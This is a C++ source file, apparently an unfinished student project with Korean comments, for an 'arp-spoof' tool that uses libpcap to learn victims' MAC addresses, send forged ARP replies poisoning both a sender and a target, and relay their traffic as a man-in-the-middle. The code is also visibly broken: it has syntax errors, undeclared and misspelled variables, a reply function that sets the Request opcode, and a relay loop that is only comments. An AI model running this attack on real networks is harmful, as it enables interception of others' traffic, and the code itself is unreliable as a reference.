#include "packet.h"
//#include "get_address.h"
#include "ip.h"


#include <thread>
#include <vector>

#define MAC_ADDR_LEN 6 
using namespace std; 

void usage();
EthArpPacket arprequest(pcap_t* handle, char *dst_mac, char *src_mac, char *src_ip, char *t_mac, char *t_ip);
void ArpReply(pcap_t* handle, Mac *dst_mac, Mac *src_mac, Ip *src_ip, Mac *t_mac, Ip *t_ip);

void printInfo(EthArpPacket packet);



int main(int argc, char* argv[]){

    if ( argc % 2 != 0 ){
        usage();
        return -1;
    }

    // ======================== 초기설정 =============================

    char attacker_mac[18] = {0,};
    char sender_mac[18] = {0,};
    char target_mac[18] = {0,};
    char broad_mac[18] = {0,};
    char empty_mac[18] = {0,};

    strcpy(broad_mac, "ff:ff:ff:ff:ff:ff");
    strcpy(empty_mac, "00:00:00:00:00:00");

    sender_ip[20];
    char target_ip[20];
    char attacker_ip[20];

    char *interface = argv[1];

    // =================== Get attacker mac, ip address ==========================
    
    uint8_t attacker_mac_temp[6];
    get_mac_address(string(argv[1]), attacker_mac_temp);
    to_hex_string(attacker_mac_temp, MAC_ADDR_LEN, attacker_mac);

    cout << "attacker mac 주소 "<< attacker_mac << endl;

    get_ip_address(interface, attacker_ip);
    std::cout << "attacker ip 주소" <<  attacker_ip << std::endl;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface,BUFSIZ,1,1,errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return -1;
	}    
    strcpy(sender_ip, argv[2]);
    strcpy(target_ip, argv[3]);

    // sender_mac 주소 알아오기 
    EthArpPacket * arppacket = new EthArpPacket;
    arppacket = arprequest(handle, broad_mac,attacker_mac,attacker_ip,empty_mac, target_ip); // target_mac 주소 알아오기 
    retype(arppacket,sender_ip, target_ip, sender_mac, target_mac);


    printInfo(arppacket);

    // sender 속이기 , target 속이기 
    ArpReply(handle,sender_mac,attacker_mac,target_ip,attacker_mac,sender_ip);// gateway_mac request (attacekr -> gateway)
    ArpReply(handle,target_mac,attacker_mac,sender_ip,attacker_mac,target_ip);// gateway_mac request (attacekr -> gateway)

    // relay 하기 

    ArpRelay();

}

    

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
};


EthArpPacket arprequest(pcap_t* handle, char *dst_mac, char *src_mac, char *src_ip, char *t_mac, char *t_ip)
{
    EthArpPacket request 


    request.eth_.dmac_ = Mac(dst_mac);
    request.eth_.smac_ = Mac(src_mac);
    request.eth_.type_ = htons(EthHdr::Arp);

    request.arp_.hrd_ = htons(ArpHdr::ETHER);
    request.arp_.pro_ = htons(EthHdr::Ip4);
    request.arp_.op_ = htons(ArpHdr::Request);

    request.arp_.hln_ = Mac::SIZE;
    request.arp_.pln_ = Ip::SIZE;
    
    request.arp_.smac_ = Mac(src_mac);
    request.arp_.sip_ = htonl(Ip(src_ip)); 

    request.arp_.tmac_ = Mac(t_mac);
    request.arp_.tip_ = htonl(Ip(t_ip));
    
    cout << request.arp_.tip_  << endl;

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if(res !=0 ){
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }


    EthArpPacket *capture; 
    int ret;
	while (true) {
		ret = pcap_next_ex(handle, &header, &packet);
		if (ret == 1) {
			capture = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
		}
		else
			continue;

		if ((ntohs(capture->arp_.op_) == ArpHdr::Reply)) {
			break;
		}

	}
	printArpInfo(*capture);

	return (*capture);


};

void retype(EthArpPacket arppacket,char* sender_ip, char* target_ip, char *sender_mac, char* target_mac){
    Mac sender_mac = arppacket.eth_smac;
    Mac target_mac = arppacket.eth_smac;
}


void ArpReply(pcap_t* handle, Mac *dst_mac, Mac *src_mac, Ip *src_ip, Mac *t_mac, Ip *t_ip)(
    
    EthArpPacket packet;
    
    packet.eth_.dmac_ = Mac(dst_mac);
    packet.eth_.smac_ = Mac(src_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.op_ = htons(ArpHdr::Request);

    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    
    packet.arp_.smac_ = Mac(src_mac);
    packet.arp_.sip_ = htonl(Ip(src_ip)); 

    packet.arp_.tmac_ = Mac(t_mac);
    packet.arp_.tip_ = htonl(Ip(t_ip));
    
    cout << packet.arp_.tip_  << endl;

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if(res !=0 ){
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

)



// sender와 target 이 보내는 패킷 relay 및 sender 와 target 이 보내는 패킷 재감염 
void ArpRelay(){
    EthArpPacket* relay_packet;


    struct pcap_pkthdr *header;
    const u_char* packet;

    while(true){
        int result = pcap_next_ex(handle, &header, &relayPacket);

        if (result == 1){
           
            reply_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(rely_packet));
        }


        // 경우의 수 1 [ 재감염 ]
            // src_ip 가 victim_ip 일 경우 sender에게 다시 보냄 
            // src_ip가 target_ip 일 경우 target에게 다시 보냄 

        // 경우의 수 2 
            // src_map = sender_mac , d_mac == my_mac 
            // relay 로 패킷 전달 
            

        // 경우의 수 3 

        





    }

}

void printInfo(EthArpPacket packet){


    

}